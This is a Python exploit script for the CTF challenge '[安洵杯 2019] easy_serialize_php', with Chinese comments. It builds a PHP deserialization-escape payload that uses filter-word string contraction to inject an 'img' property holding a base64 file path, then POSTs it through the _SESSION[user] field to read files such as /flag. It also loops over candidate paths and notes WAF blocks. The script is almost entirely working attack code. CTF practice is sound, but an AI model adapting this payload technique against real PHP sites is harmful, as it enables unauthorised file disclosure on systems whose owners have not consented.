#!/usr/bin/env python3
"""
[安洵杯 2019] easy_serialize_php - Final Exploit

PHP序列化逃逸漏洞利用
利用filter函数的字符串收缩特性注入恶意属性

使用方法:
1. 从BUUCTF启动题目实例
2. 更新下方URL变量
3. 运行脚本
"""

import requests
import base64
import re
import time

# ============ 配置 ============
URL = "http://YOUR_INSTANCE.node5.buuoj.cn:81/"
DELAY = 0.5  # 请求间隔，避免触发限速

# 可能的flag位置
FLAG_PATHS = [
    "/flag",
    "/flag.txt",
    "/var/www/html/flag.php",
    "/var/www/html/fl1g.php",
    "/home/flag",
    "/tmp/flag",
]

# 收缩词列表（按收缩字节数）
CONTRACTION_WORDS = {
    "php": 3,   # php -> "" (收缩3字节)
    "flag": 4,  # flag -> "" (收缩4字节)
    "php5": 4,  # php5 -> "" (收缩4字节)
    "php4": 4,  # php4 -> "" (收缩4字节)
    "fl1g": 4,  # fl1g -> "" (收缩4字节)
}


def test_connection():
    """测试实例是否可用"""
    try:
        r = requests.get(URL, timeout=10)
        if "实例无法访问" in r.text or "Instance can't be reached" in r.text:
            return False
        return True
    except:
        return False


def build_payload(target_path, word="flag"):
    """
    构造序列化逃逸payload

    原理：
    1. filter函数将过滤词替换为空，造成字符串收缩
    2. 序列化长度字段不变，反序列化时读取错误字节数
    3. 解析错位导致注入的属性被正确解析
    """
    target_b64 = base64.b64encode(target_path.encode()).decode()

    # 注入payload - 关闭当前属性并注入新的img属性
    # ";s:3:"img";s:XX:"base64_path";}
    inject = '";s:3:"img";s:' + str(len(target_b64)) + ':"' + target_b64 + '";}'

    # 计算需要的收缩词数量
    contraction = CONTRACTION_WORDS.get(word, 4)
    n = (len(inject) + contraction - 1) // contraction

    # 构造完整payload
    payload = word * n + inject

    return payload


def exploit(target_path, word="flag"):
    """
    执行漏洞利用
    """
    payload = build_payload(target_path, word)
    data = {"_SESSION[user]": payload}

    try:
        r = requests.post(
            URL + "?f=show_image",
            data=data,
            timeout=15,
            headers={"User-Agent": "Mozilla/5.0"}
        )

        # 检查响应
        if r.status_code == 405:
            return None, "WAF blocked (405 Not Allowed)"

        # 查找flag
        match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
        if match:
            return match.group(0), "Found flag"

        # 检查是否有文件内容
        if len(r.text) > 100 and "guest_img" not in r.text:
            return r.text[:500], "Possible file content"

        return None, f"Status: {r.status_code}, Length: {len(r.text)}"

    except Exception as e:
        return None, f"Error: {e}"


def main():
    print("=" * 60)
    print("[安洵杯 2019] easy_serialize_php Exploit")
    print("=" * 60)

    # 测试连接
    print("\n[*] Testing connection...")
    if not test_connection():
        print("[-] Instance is not available!")
        print("[!] Please restart the challenge from BUUCTF platform")
        print("[!] Then update URL in this script")
        return

    print("[+] Instance is reachable")

    # 尝试不同的flag位置和收缩词
    for path in FLAG_PATHS:
        print(f"\n[*] Trying path: {path}")

        for word in CONTRACTION_WORDS.keys():
            result, status = exploit(path, word)

            if result:
                if result.startswith("flag{") or result.startswith("FLAG{"):
                    print(f"\n[+] SUCCESS!")
                    print(f"[+] Flag: {result}")
                    return result
                else:
                    print(f"[*] Got content with '{word}': {status}")
                    print(f"    Preview: {result[:200]}...")
            else:
                if "WAF" in status:
                    print(f"[-] {status} (trying next word...)")
                else:
                    print(f"[-] {status}")

            time.sleep(DELAY)

    print("\n[-] Failed to get flag")
    print("[!] Try manually with curl or Burp Suite")


if __name__ == "__main__":
    main()
